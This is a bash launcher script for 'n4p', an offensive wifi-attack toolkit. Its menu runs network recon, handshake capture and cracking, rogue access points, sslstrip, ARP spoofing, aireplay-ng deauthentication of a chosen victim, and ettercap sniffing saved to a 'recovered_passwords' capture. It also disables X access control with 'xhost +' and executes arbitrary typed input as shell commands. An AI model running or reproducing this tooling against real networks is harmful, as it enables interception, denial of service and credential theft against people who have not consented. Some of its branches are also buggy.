
#!/bin/bash
if [[ $(id -u) != 0 ]]; then # Verify we are not root
	xhost +
else
   echo "This script can not be ran as root or with sudo." 1>&2
   exit 1
fi

#retrieve absolute path structures so we can use symlinks and config files
SOURCE="${BASH_SOURCE[0]}"
while [[ -h "$SOURCE" ]]; do # resolve $SOURCE until the file is no longer a symlink
    DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
    SOURCE="$(readlink "$SOURCE")"
    [[ $SOURCE != /* ]] && SOURCE="$SOURCE" # if $SOURCE was a relative symlink, we need to resolve it's relativeness to the path where the symlink file was located
done
DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
DIR_CONF=/etc/n4p
DIR_LOGO=/usr/share/n4p

get_RCstatus() # What is the status from OpenRC of the service
{
    STATUS=$(/etc/init.d/$1 status | sed 's/* status: //g' | cut -d ' ' -f 2)
}

get_name() #Parse the values in the config file
{
    USE=$(grep $1 ${DIR_CONF}/n4p.conf | awk -F= '{print $2}')
}

# Text color variables
TXT_BLD=$(tput bold)             # Bold
BLD_BLU=${txtbld}$(tput setaf 4) # blue
BLD_TEA=${txtbld}$(tput setaf 6) # teal
BLD_WHT=${txtbld}$(tput setaf 7) # white
PUR=$(tput setaf 5)              # purple
TXT_RST=$(tput sgr0)             # Reset
EYES=$(tput setaf 6)
AP_GATEWAY=$(grep routers ${DIR_CONF}/dhcpd.conf | awk -Frouters '{print $2}' | cut -d ';' -f 1 | cut -d ' ' -f 2)
get_name "IFACE1="; IFACE1=$USE
get_name "OS="; OS=$USE
get_name "NETWORKMANAGER="; NETWORKMANAGER=$USE
get_name "OS="; OS=$USE
get_name "INTERFACE="; INTERFACE=$USE
MON="${IFACE1}mon"
FAILSAFE="th8934pjghwt74ygp"
echo "${BLD_TEA}$(cat ${DIR_LOGO}/opening.logo)${TXT_RST}"; sleep 1

SESSIONFOLDER=/tmp/n4p # Set our tmp working configuration directory and then build config files
[ ! -d "$SESSIONFOLDER" ] && mkdir "$SESSIONFOLDER"; mkdir -p "$SESSIONFOLDER" "${SESSIONFOLDER}/logs"

if [[ $NETWORKMANAGER == "True" ]]; then #n4p cant operate airmon and such with network manager hogging everything. We must kill it.
    if [[ $OS == "Pentoo" ]]; then
        if [[ -f /etc/init.d/NetworkManager ]]; then
            get_RCstatus "NetworkManager"
            [[ $STATUS == 'started' ]] && sudo /etc/init.d/NetworkManager stop
        else
            echo "Error in Config file. NetworkManager does not appear to be present."
        fi
    else
        if [[ -f /etc/init.d/network-manager ]]; then
            sudo service network-manager stop
        fi
   fi
elif [[ $OS == "Pentoo" ]]; then
        if [[ -e /etc/init.d/net.$IFACE1 ]]; then
            echo "$INFO Getting status of $IFACE1"
            get_RCstatus "net.$IFACE1"
            [[ $STATUS == 'started' ]] && /etc/init.d/net.$IFACE1 stop
        fi
fi

trap killemAll INT HUP;

cut_choice() #This function parses the input commands in advanced mode for use with pre defined custom interactions
{
    CHOICE=${CHOICE:4:${#CHOICE}}
}

menu()
{
    if [[ $INTERFACE == "Basic" ]]; then
      echo -e "\n"
      echo -e "${BLD_WHT}
                /\#/\         '\\-//\`       |.===. '   
                /(${TXT_RST}${EYES}o o${TXT_RST}${BLD_WHT})\        (${EYES}o o${TXT_RST}${BLD_WHT})        ${TXT_RST}${PUR}{}${TXT_RST}${EYES}o o${TXT_RST}${PUR}{}${TXT_RST}${BLD_WHT}  
      +======ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo======+
      | ${TXT_RST}${BLD_TEA}1${TXT_RST}${BLD_WHT})  Set devices for use and attack                  |
      | ${TXT_RST}${BLD_TEA}2${TXT_RST}${BLD_WHT})  Perform wifi radius recon                       |
      | ${TXT_RST}${BLD_TEA}3${TXT_RST}${BLD_WHT})  Airodump-ng .cap file or Wash network           |
      | ${TXT_RST}${BLD_TEA}4${TXT_RST}${BLD_WHT})  Crack .cap and hashes                           |
      | ${TXT_RST}${BLD_TEA}5${TXT_RST}${BLD_WHT})  Attack or Launch AP                             |
      | ${TXT_RST}${BLD_TEA}6${TXT_RST}${BLD_WHT})  Enumerate the Firewall ${TXT_RST}${BLD_TEA}(Run this option last)${TXT_RST}${BLD_WHT}   |
      | ${TXT_RST}${BLD_TEA}7${TXT_RST}${BLD_WHT})  Kick everyone                                   |
      | ${TXT_RST}${BLD_TEA}8${TXT_RST}${BLD_WHT})  Start Ettercap Sniffer                          |
      | ${TXT_RST}${BLD_TEA}0${TXT_RST}${BLD_WHT})  EXIT                                            |
      +=====================================================+${TXT_RST}"
      read -p "Option: " CHOICE
    else
        echo ""
        read -p "${BLD_WHT}N4P${TXT_RST}${BLD_TEA}$ ${TXT_RST}" CHOICE
    fi

    if [[ $CHOICE == "advanced" || $CHOICE == "Advanced" ]]; then #Find out what the user wants then recall the menu arrangement based on this.
        INTERFACE="Advanced"
        menu
    elif [[ $CHOICE == "simple" || $CHOICE == "basic" || $CHOICE == "Simple" || $CHOICE == "Basic" ]]; then
        INTERFACE="Basic"
        menu
    #The current defined menu options are compleated now we look for user actions
    elif [[ $CHOICE == 0 || $CHOICE == "quit" || $CHOICE == "exit" ]]; then
        killemAll $FAILSAFE
    elif [[ $CHOICE == "?" || $CHOICE == "help" || $CHOICE == "Help" ]]; then
        echo "Help! Commands and options are."
        echo "list modules | show modules"
        echo "use [ atom ]"
        echo "show options"
        echo "run"
        echo "basic | simple"
        echo "advanced"
        echo "Any basic mode menu option number. 0-9"
        echo "Any bash command"
    elif [[ $CHOICE == 1 ]]; then
        sudo nano /etc/n4p/n4p.conf
    elif [[ $CHOICE == 2 ]]; then
        sudo xterm -bg black -fg blue -T "Recon" -geometry 90x20 -e ./modules/recon &>/dev/null &
    elif [[ $CHOICE == 3 ]]; then
        if [[ $ATTACK == "WPS" ]]; then
            sudo xterm -bg black -fg blue -T "Wash" -geometry 90x20 -e ./modules/wash &>/dev/null &
        else
            sudo xterm -bg black -fg blue -T "Dump cap" -geometry 90x20 -e ./modules/dump &>/dev/null &
        fi
    elif [[ $CHOICE == 4 ]]; then
        get_name "CRACK="; CRACK=$USE
        if [[ $CRACK == "Aircrack-ng" ]]; then
            get_name "ATTACK="; ATTACK=$USE
            if [[ $ATTACK == "WEP" ]]; then
                get_name "VICTIM_BSSID="; VICTIM_BSSID=$USE
                sudo xterm -T "WEP CRACK ${VICTIM_BSSID}" -geometry 90x15 -e aircrack-ng ${SESSIONFOLDER}/${VICTIM_BSSID}-01.cap &>/dev/null &
            fi
        elif [[ $CRACK == "Hashcat" ]]; then
            sudo xterm -hold -bg black -fg blue -T "Cracking" -geometry 90x20 -e ./modules/cracking &>/dev/null &
        else
            echo "CRACK= configuration error, check config file"
        fi
    elif [[ $CHOICE == 5 ]]; then
        get_name "ATTACK="; ATTACK=$USE
        if [[ $ATTACK == "Handshake" || $ATTACK == "Karma" || -z $ATTACK ]]; then
            sudo xterm -bg black -fg blue -T "Airbase" -geometry 90x20 -e ./modules/airbase &>/dev/null &
        elif [[ $ATTACK == "WPS" ]]; then
            sudo xterm -bg black -fg blue -T "Bully" -geometry 90x20 -e ./modules/recon &>/dev/null &
        elif [[ $ATTACK == "SslStrip" ]]; then
            echo -e "SSL Strip Log File\n" > ${SESSIONFOLDER}/ssl.log
            sudo xterm -T "SSL Strip" -geometry 50x5 -e sslstrip -p -k -f lock.ico -w ${SESSIONFOLDER}/ssl.log &>/dev/null &
        elif [[ $ATTACK == "WPE" ]]; then
            sudo xterm -bg black -fg blue -T "WPE" -geometry 90x20 -e ./modules/wpe  &>/dev/null &
        elif [[ $ATTACK == "SslStrip" ]]; then
            get_name "IFACE1="; IFACE1=$USE
            get_name "ARP_VICTIM="; ARP_VICTIM=$USE
            sudo xterm -T "Arpspoof $IFACE1 $AP_GATEWAY" -geometry 90x15 -e arpspoof -i $IFACE1 $ARP_VICTIM &>/dev/null &
        fi
    elif [[ $CHOICE == 6 ]]; then
        sudo xterm -bg black -fg blue -T "iptables" -geometry 90x20 -e ./modules/n4p_iptables &>/dev/null &
    elif [[ $CHOICE == 7 ]]; then
        get_name "VICTIM_BSSID="; VICTIM_BSSID=$USE
        get_name "STATION="; STATION=$USE
        get_name "IFACE1="; IFACE1=$USE
        MON="${IFACE1}mon"
        sudo xterm -bg black -fg blue -T "Aireplay" -geometry 90x20 -e aireplay-ng --deauth 1 -a $VICTIM_BSSID -c $STATION ${IFACE1}mon &>/dev/null &
    elif [[ $CHOICE == 8 ]]; then
        get_name "BRIDGE_NAME="; BR_NAME=$USE
        get_name "AP="; AP_NAME=$USE
        get_name "BRIDGED="; BRIDGED=$USE
        [[ ! -f ${SESSIONFOLDER}/recovered_passwords.pcap ]] && sudo touch ${SESSIONFOLDER}/recovered_passwords.pcap
        get_name "ETTERCAP_OPTIONS="; ETTERCAP_OPTIONS=$USE
        if [[ $BRIDGED == "True" ]]; then
            sudo xterm -T "ettercap $BR_NAME" -geometry 90x20 -e ettercap ${ETTERCAP_OPTIONS} -i ${BR_NAME} &>/dev/null &
        elif [[ $AP_NAME == "AIRBASE" ]]; then
            sudo xterm -T "ettercap at0" -geometry 90x20 -e ettercap -i at0 ${ETTERCAP_OPTIONS} -w ${SESSIONFOLDER}/recovered_passwords.pcap &>/dev/null &
        #elif [[ $AP_NAME == "HOSTAPD" ]]; then
        #   sudo xterm -T "ettercap $IFACE1" -geometry 90x20 -e ettercap $ETTERCAP_OPTIONS -i $IFACE1 -w ${SESSIONFOLDER}/recovered_passwords.pcap &>/dev/null &
        fi
    else
        ###########################################################################################################################
        # This section is all about advanced mode. We allow the user to run custom modules and interact with the shell directly
        ###########################################################################################################################
        if [[ $INTERFACE == "Advanced" ]]; then
            if [[ $CHOICE == "use"* ]]; then
                cut_choice $CHOICE
                echo "use=$CHOICE"
                if [[ ! -f modules/$CHOICE ]]; then
                    echo "${BLD_TEA}You seem to be confused.${TXT_RST}"
                else
                    run=$CHOICE
                fi
            elif [[ $CHOICE == "run" ]]; then
                if [[ -n $CHOICE ]]; then # Check if the CHOICE is empty before trying to execute
                    sudo xterm -hold -bg black -fg blue -T "N4P Advanced runtime" -geometry 65x15 -e ./modules/$run &>/dev/null &
                    #sudo ./modules/$CHOICE
                else
                    echo "${BLD_TEA}Nothing to do!${TXT_RST}"
                fi
            elif [[ $CHOICE == "show options" ]]; then
              if [[ -n $run ]]; then # Check if the CHOICE is empty before trying to execute
                  grep get_name\ \" modules/$run | cut -d '"' -f 2
              else
                  echo "${BLD_TEA}Nothing to do!${TXT_RST}"
              fi
            elif [[ $CHOICE == "list modules" || $CHOICE == "show modules" ]]; then
                printf %s "$(ls modules/)"
            #elif [[ $CHOICE = set* ]]; then
            #      AP=tester
            #      cut_CHOICE $CHOICE
            #      var=$(echo "$CHOICE" | cut -d ' ' -f 1)
            #      str=$(echo "$CHOICE" | cut -d ' ' -f 2)
            #      printf $var=$str
            #      echo $AP
            else
                printf %s "$($CHOICE)"
                echo -e "\n\n"
                menu
            fi
        else
            echo "${BLD_TEA}I'm confused.${TXT_RST}"
            echo "${BLD_TEA}Why not try Advanced mode!${TXT_RST}"
        fi
    fi
    menu
}

killemAll()
{
    echo ""
    if [[ $1 != $FAILSAFE ]]; then
        clear
        menu
    else
        sudo ./modules/rebuild_network
        xhost -
        echo "${BLD_TEA}$(cat ${DIR_LOGO}/zed.logo)${TXT_RST}"
        exit 0
    fi
}
menu